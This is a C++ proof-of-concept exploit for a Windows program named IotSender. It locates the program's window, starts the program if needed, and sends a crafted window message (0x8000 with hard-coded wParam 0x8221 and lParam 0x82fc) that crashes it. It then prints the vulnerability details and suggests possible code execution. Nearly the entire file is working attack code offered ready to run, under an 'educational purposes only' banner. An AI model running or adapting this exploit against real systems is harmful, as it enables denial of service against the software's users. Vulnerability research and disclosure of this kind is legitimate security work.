/**
 * IotSender Exploit Proof-of-Concept
 * 
 * 
 * This PoC demonstrates a vulnerability in the IotSender application
 * where sending a Windows message with specific parameters causes a crash.
 */

#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <iomanip>

// Constants
const std::string WINDOW_NAME = "IotSender";
const int SEND_IOT_COM = 0x8000;
const int SEND_IOT_LOG = 0x8001;

// Exploit parameters
const WPARAM CRASH_WPARAM = 0x8221;
const LPARAM CRASH_LPARAM = 0x82fc;

// Function to check if IotSender is running
bool isIotSenderRunning() {
    HWND hWnd = FindWindowA(NULL, WINDOW_NAME.c_str());
    return (hWnd != NULL);
}

// Function to start IotSender
bool startIotSender() {
    std::string processPath = "C:\\Program Files (x86)\\G1200\\IotSender\\IotSender.exe";
    
    // Try to start the process
    STARTUPINFOA si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;
    
    if (CreateProcessA(processPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        // Wait for process to initialize
        std::this_thread::sleep_for(std::chrono::seconds(2));
        return true;
    }
    
    return false;
}

// Function to trigger the vulnerability
bool triggerVulnerability() {
    // Find the IotSender window
    HWND hWnd = FindWindowA(NULL, WINDOW_NAME.c_str());
    if (hWnd == NULL) {
        std::cout << "Error: IotSender window not found!" << std::endl;
        return false;
    }
    
    std::cout << "Found IotSender window: 0x" << std::hex << (uintptr_t)hWnd << std::endl;
    
    // Send the message with the crash-inducing parameters
    std::cout << "Sending exploit message with wParam: 0x" << std::hex << CRASH_WPARAM 
              << ", lParam: 0x" << CRASH_LPARAM << std::endl;
    
    SendMessage(hWnd, SEND_IOT_COM, CRASH_WPARAM, CRASH_LPARAM);
    
    // Check if IotSender is still running
    std::this_thread::sleep_for(std::chrono::milliseconds(500));
    if (!isIotSenderRunning()) {
        std::cout << "Exploit successful! IotSender has crashed." << std::endl;
        return true;
    } else {
        std::cout << "Exploit failed - IotSender is still running." << std::endl;
        return false;
    }
}

int main(int argc, char* argv[]) {
    std::cout << "IotSender Exploit PoC - FOR EDUCATIONAL PURPOSES ONLY" << std::endl;
    std::cout << "======================================================" << std::endl;
    std::cout << std::endl;
    
    // Check if IotSender is running, if not try to start it
    if (!isIotSenderRunning()) {
        std::cout << "IotSender is not running. Attempting to start it..." << std::endl;
        if (!startIotSender()) {
            std::cout << "Failed to start IotSender. Please start it manually." << std::endl;
            std::cout << "Press Enter to continue once IotSender is running..." << std::endl;
            std::cin.get();
            
            if (!isIotSenderRunning()) {
                std::cout << "IotSender is still not running. Exiting." << std::endl;
                return 1;
            }
        }
    }
    
    std::cout << "IotSender is running. Preparing to trigger vulnerability..." << std::endl;
    std::cout << std::endl;
    
    // Add a short delay
    std::this_thread::sleep_for(std::chrono::seconds(1));
    
    // Trigger the vulnerability
    bool result = triggerVulnerability();
    
    // Summary
    std::cout << std::endl;
    std::cout << "Vulnerability details:" << std::endl;
    std::cout << "- Target: IotSender.exe" << std::endl;
    std::cout << "- Type: Improper Windows message parameter handling" << std::endl;
    std::cout << "- Message: SEND_IOT_COM (0x8000)" << std::endl;
    std::cout << "- wParam: 0x" << std::hex << CRASH_WPARAM << std::endl;
    std::cout << "- lParam: 0x" << std::hex << CRASH_LPARAM << std::endl;
    std::cout << "- Impact: Application crash (DoS)" << std::endl;
    std::cout << std::endl;
    
    std::cout << "This vulnerability could potentially be exploited for:" << std::endl;
    std::cout << "1. Denial of Service attacks" << std::endl;
    std::cout << "2. Possible arbitrary code execution (requires further analysis)" << std::endl;
    std::cout << "3. Bypassing IoT message validation" << std::endl;
    
    std::cout << std::endl;
    std::cout << "Press Enter to exit..." << std::endl;
    std::cin.get();
    
    return 0;
} 
